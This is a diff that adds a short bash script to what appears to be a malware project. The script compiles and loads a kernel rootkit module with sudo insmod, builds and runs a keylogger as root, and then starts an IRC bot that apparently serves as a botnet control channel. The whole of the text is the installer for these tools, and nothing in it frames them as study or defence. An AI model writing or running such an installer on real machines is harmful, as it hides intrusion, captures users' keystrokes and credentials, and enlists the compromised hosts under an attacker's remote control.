@@ -1,0 +1,12 @@
+#!/bin/bash
+
+# compile and install the rootkit and keylogger
+cd lkm/
+make
+make col_kl
+sudo insmod rootkit.ko
+sudo ./col_kl
+
+# run the IRC bot
+cd ../irc
+sudo python bot.py
